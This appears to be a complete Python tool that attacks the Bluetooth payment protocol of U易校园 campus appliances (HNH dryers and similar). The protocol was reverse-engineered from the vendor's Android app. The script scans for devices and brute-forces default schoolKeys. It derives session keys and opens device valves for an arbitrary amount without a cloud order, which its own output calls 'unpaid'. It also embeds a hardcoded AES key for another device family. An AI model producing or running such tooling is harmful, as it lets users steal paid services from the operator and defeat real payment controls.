#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HNH 蓝牙设备控制器 (U易校园 HNH/干衣/吹风类设备)
协议逆向自 UYXY.apk (com.zdtc.ue.school, HNHBluetoothService/OrderUtil/Local/DES/ByteUtil)

链路:
  扫码 -> App云端下单(useEquipment) -> BLE直连设备 -> 握手(A70108+schoolKey)
  -> 派生会话密钥 f.y = DES_ECB( DES_ECB(schoolKey, v), schoolKey )
  -> 开阀(A70208 + DES(设备ID+金额+p,q)) -> 心跳"123321" -> 关阀/结账(A70708) -> 余额(A70808)

用法:
  python3 hnh_ctl.py scan                      # 扫附近设备(看名字/MAC/UUID)
  python3 hnh_ctl.py use --mac MAC --key SCHOOLKEY_HEX --phone 13812345678 --amount 1.0 [--secs 60]
  python3 hnh_ctl.py brute-key --mac MAC --phone 13812345678 --amount 0.5   # 常见默认schoolKey穷举握手
依赖: pip3 install bleak   (macOS 需在 系统设置-隐私-蓝牙 里允许终端)
"""
import argparse
import asyncio
import sys
import time

try:
    from bleak import BleakClient, BleakScanner
    from bleak.backends.characteristic import BleakGATTCharacteristic
except ImportError:
    print("[!] 缺少 bleak: pip3 install bleak")
    sys.exit(1)

from Crypto.Cipher import DES  # pip3 install pycryptodome
from Crypto.Cipher import AES

# ---------- XN 协议 (XnCommandUtil/AESUtil/Crc8Utils) ----------
XN_SVC_UUID = "0000ff12-0000-1000-8000-00805f9b34fb"
XN_WR_UUID  = "0000ff01-0000-1000-8000-00805f9b34fb"
XN_NT_UUID  = "0000ff02-0000-1000-8000-00805f9b34fb"
XN_AES_KEY  = bytes.fromhex("43763859685a366b4d4c773935633361")
XN_AES_IV   = b"0102030405123456"
XN_LINK     = "140201"  # 握手/链接

def xn_crc8(data: bytes) -> int:
    """Crc8Utils.a(): CRC-8, poly 0x8C"""
    b = 0
    for byte in data:
        b ^= byte
        for _ in range(8):
            b = ((b & 0xFF) >> 1) ^ 0x8C if (b & 1) else (b & 0xFF) >> 1
    return b

def xn_enc(hexstr: str) -> str:
    """AESUtil.b(): AES/CBC/ZeroPad -> hex"""
    raw = bytes.fromhex(hexstr)
    pad = (16 - len(raw) % 16) % 16
    raw += b"\x00" * pad
    return AES.new(XN_AES_KEY, AES.MODE_CBC, XN_AES_IV).encrypt(raw).hex().upper()

def xn_dec(hexstr: str) -> str:
    raw = bytes.fromhex(hexstr)
    return AES.new(XN_AES_KEY, AES.MODE_CBC, XN_AES_IV).decrypt(raw).hex().upper()

def xn_frame(header: str, payload_hex: str) -> bytes:
    enc = xn_enc(payload_hex)
    body = header + enc
    crc = xn_crc8(bytes.fromhex(body))
    return bytes.fromhex(body + "%02X" % crc)

def xn_link_frame() -> bytes:
    """XnCommandUtil.i(): 140201 + AES(13041e + 0*26) + CRC8"""
    return xn_frame(XN_LINK, "13041e" + "00" * 26)

# ---------- 协议常量 (来自 Local.java) ----------
TX_HEADERS = {
    "link":    "A70108",  # 握手
    "open":    "A70208",  # 开阀+金额
    "rate1":   "A70408",  # 费率1
    "rate2":   "A70508",  # 费率2
    "rate2b":  "A70608",  # 费率2(第二档)
    "close":   "A70708",  # 关阀+结账
    "balance": "A70808",  # 查询余额
    "key":     "A70A08",  # 获取密钥
    "isp":     "A70B08",  # 进入ISP(固件升级)
}
RX_HEADERS = {
    "A8010A": "握手",
    "A80200": "开阀成功",
    "A80410": "关阀成功",
    "A80500": "费率1成功",
    "A80600": "费率2成功",
    "A80708": "结账成功(含剩余金额)",
    "A80808": "查询余额成功",
    "A80A00": "获取密钥成功",
    "A80B00": "ISP成功",
}
SVC_UUID = "0000fee9-0000-1000-8000-00805f9b34fb"
WR_UUID  = "d44bc439-abfd-45a2-b575-925416129600"
NT_UUID  = "d44bc439-abfd-45a2-b575-925416129601"

# 常见默认 schoolKey 猜测 (8字节hex=16字符), 厂商默认值
KEY_GUESSES = [
    "0000000000000000", "3132333435363738",  # "12345678"
    "3030303030303030",                      # "00000000"
    "3132333435363738"[::-1],
    "8888888888888888", "ffffffffffffffff", "1234567812345678",
    "0001020304050607", "aabbccdd11223344",
    "313233333231313233333231",  # 不含
]


def xor_crc(hexstr: str) -> str:
    """ByteUtil.i(): hex字符串逐字节XOR, 取低8位两位大写hex"""
    b = 0
    for i in range(0, len(hexstr), 2):
        b ^= int(hexstr[i:i + 2], 16)
    return "%02X" % (b & 0xFF)


def build_frame(header: str, payload_hex: str) -> bytes:
    """TX帧 = 命令头(6hex) + 负载hex + XOR校验(1字节)"""
    s = header + payload_hex.upper()
    return bytes.fromhex(s + xor_crc(s))


def des_enc(data: bytes, key: bytes) -> bytes:
    """DES.java: DES/ECB/NoPadding"""
    return DES.new(key, DES.MODE_ECB).encrypt(data)


def derive_session_key(handshake_payload: bytes, school_key: bytes) -> bytes:
    """OrderUtil.j(): v=异或派生 -> w=DES(v) -> y=DES(schoolKey, v)再DES(w, schoolKey)"""
    n, o, p, q, r, s, t, u = handshake_payload[:8]
    v = bytes([
        n ^ 0x20, o ^ 0x16, p ^ 0x10, q ^ 0x18,
        r ^ (n ^ 0x20), s ^ (o ^ 0x16), t ^ (p ^ 0x10), u ^ (q ^ 0x18),
    ])
    w = des_enc(school_key, v)
    y = des_enc(w, school_key)
    return y


def phone_k(phone: str) -> bytes:
    """f.K = 手机号第3位之后8位数字串直接hex (BCD)"""
    digits = "".join(c for c in phone if c.isdigit())[-11:]
    if len(digits) != 11:
        digits = digits.zfill(11)
    return bytes.fromhex(digits[3:11])


class HNHController:
    def __init__(self, mac: str):
        self.mac = mac
        self.client = None
        self.session_key = None
        self.pq = None
        self.rx_queue = asyncio.Queue()

    async def connect(self):
        self.client = BleakClient(self.mac, timeout=15)
        await self.client.connect()
        await self.client.start_notify(NT_UUID, self._on_rx)
        return self.client

    def _on_rx(self, ch: BleakGATTCharacteristic, data: bytearray):
        hx = bytes(data).hex().upper()
        head = hx[:6] if len(hx) >= 6 else hx
        name = RX_HEADERS.get(head, "?")
        tail = ""
        if len(hx) > 6:
            tail = hx[6:-6] if len(hx) > 12 else hx[6:]
        print(f"[RX] {hx}  <{name}> payload={tail}")
        self.rx_queue.put_nowait(bytes(data))

    async def wait_rx(self, head3: bytes, timeout=6.0):
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                data = await asyncio.wait_for(self.rx_queue.get(), deadline - time.time())
            except asyncio.TimeoutError:
                return None
            if data[:3].hex().upper() == head3:
                return data
        return None

    async def tx(self, frame: bytes):
        print(f"[TX] {frame.hex().upper()}")
        await self.client.write_gatt_char(WR_UUID, frame, response=False)

    async def handshake(self, school_key_hex: str) -> bool:
        key = bytes.fromhex(school_key_hex)
        await self.tx(build_frame(TX_HEADERS["link"], school_key_hex.upper()))
        data = await self.wait_rx("A8010A")
        if not data:
            print("[!] 握手无响应 (schoolKey 可能不对/距离太远)")
            return False
        err = data[2]
        if err != 0:
            print(f"[!] 握手被拒, 错误码 {err:02X}")
            return False
        self.session_key = derive_session_key(data[3:-3], key)
        self.pq = data[3:-3][2:4]  # p,q
        print(f"[+] 握手成功, 会话密钥 f.y = {self.session_key.hex().upper()}")
        return True

    async def open_valve(self, phone: str, amount_yuan: float):
        k = phone_k(phone)
        amt = int(round(amount_yuan * 100))  # rate=100
        buf = k + bytes([(amt >> 8) & 0xFF, amt & 0xFF]) + self.pq
        enc = des_enc(buf, self.session_key).hex().upper()
        await self.tx(build_frame(TX_HEADERS["open"], enc))
        data = await self.wait_rx("A80200")
        if not data:
            print("[!] 开阀无响应")
            return False
        if data[2] != 0:
            print(f"[!] 开阀失败, 错误码 {data[2]:02X}")
            return False
        print(f"[+] 开阀成功! 金额 {amount_yuan} 元 (未走云端订单)")
        return True

    async def heartbeat_loop(self, secs: int):
        end = time.time() + secs
        while time.time() < end:
            print("[TX] 123321 (心跳)")
            await self.client.write_gatt_char(WR_UUID, b"123321", response=False)
            await asyncio.sleep(2)

    async def close_settle(self):
        """关阀+结账: payload = DES(K[4] + 余额G,H + p,q)"""
        k = phone_k(self._phone)
        buf = k + bytes([0, 0]) + self.pq  # G,H 先置0; 真正结账可用查询余额后的值
        enc = des_enc(buf, self.session_key).hex().upper()
        await self.tx(build_frame(TX_HEADERS["close"], enc))
        d1 = await self.wait_rx("A80708", 4)
        d2 = await self.wait_rx("A80410", 4)
        print("[+] 已发送关阀/结账", "(结账回执: %s)" % (d1.hex().upper() if d1 else "无"))


async def cmd_scan():
    print("[*] 扫描 BLE 设备 8 秒...")
    devices = await BleakScanner.discover(timeout=8)
    hits = [d for d in devices if d.name]
    print(f"共发现 {len(devices)} 个设备, {len(hits)} 个有名")
    for d in sorted(hits, key=lambda x: -x.rssi or 0):
        print(f"  {d.address}  RSSI={d.rssi:>4}  {d.name}")
    # 顺便找 fee9 服务的
    for d in hits:
        if any(k in (d.name or "").upper() for k in ("HNH", "UY", "CFJ", "CSJ", "D9", "QPP")):
            print(f"[*] 疑似目标: {d.address} {d.name}")


async def cmd_use(mac, key, phone, amount, secs):
    c = HNHController(mac)
    print(f"[*] 连接 {mac} ...")
    await c.connect()
    print("[+] GATT 已连接, 通知已开启")
    ok = await c.handshake(key)
    if not ok:
        return
    c._phone = phone
    if await c.open_valve(phone, amount):
        print(f"[*] 设备已开, 使用 {secs} 秒 (心跳维持)...")
        await c.heartbeat_loop(secs)
        await c.close_settle()
    await c.client.disconnect()


async def cmd_brute(mac, phone, amount):
    for key in KEY_GUESSES:
        print(f"\n[*] 尝试 schoolKey = {key}")
        c = HNHController(mac)
        try:
            await c.connect()
            if await c.handshake(key):
                print(f"[!!!] 命中默认密钥: {key}")
                c._phone = phone
                if await c.open_valve(phone, amount):
                    print("[+] 开阀成功(未付费). 手动 ctrl-c 前会心跳60s")
                    await c.heartbeat_loop(60)
                    await c.close_settle()
                await c.client.disconnect()
                return
            await c.client.disconnect()
        except Exception as e:
            print(f"[!] {e}")
    print("[-] 默认密钥未命中, 需要从 findDeviceRate 接口取真实 schoolKey")


async def cmd_xn(mac):
    """XN 型设备: 发握手并打印回执 (AES密钥硬编码, 无需schoolKey)"""
    print(f"[*] 连接 XN 设备 {mac} ...")
    client = BleakClient(mac, timeout=15)
    await client.connect()
    q = asyncio.Queue()

    def on_rx(ch, data):
        hx = bytes(data).hex().upper()
        print(f"[RX] {hx}")
        if len(hx) > 8:
            print(f"     解密: {xn_dec(hx[6:-2])}")
        q.put_nowait(bytes(data))

    await client.start_notify(XN_NT_UUID, on_rx)
    f = xn_link_frame()
    print(f"[TX] {f.hex().upper()}")
    await client.write_gatt_char(XN_WR_UUID, f, response=False)
    await asyncio.sleep(3)
    await client.disconnect()


def main():
    ap = argparse.ArgumentParser(description="HNH 蓝牙设备控制器 (U易校园)")
    sub = ap.add_subparsers(dest="cmd", required=True)
    sub.add_parser("scan")
    p_use = sub.add_parser("use")
    p_use.add_argument("--mac", required=True)
    p_use.add_argument("--key", required=True, help="schoolKey 16位hex")
    p_use.add_argument("--phone", default="13800000000")
    p_use.add_argument("--amount", type=float, default=1.0)
    p_use.add_argument("--secs", type=int, default=60)
    p_br = sub.add_parser("brute-key")
    p_br.add_argument("--mac", required=True)
    p_br.add_argument("--phone", default="13800000000")
    p_br.add_argument("--amount", type=float, default=0.5)
    p_xn = sub.add_parser("xn")
    p_xn.add_argument("--mac", required=True, help="XN型设备(ff12服务) MAC")
    args = ap.parse_args()

    if args.cmd == "scan":
        asyncio.run(cmd_scan())
    elif args.cmd == "use":
        asyncio.run(cmd_use(args.mac, args.key, args.phone, args.amount, args.secs))
    elif args.cmd == "brute-key":
        asyncio.run(cmd_brute(args.mac, args.phone, args.amount))
    elif args.cmd == "xn":
        asyncio.run(cmd_xn(args.mac))


if __name__ == "__main__":
    main()
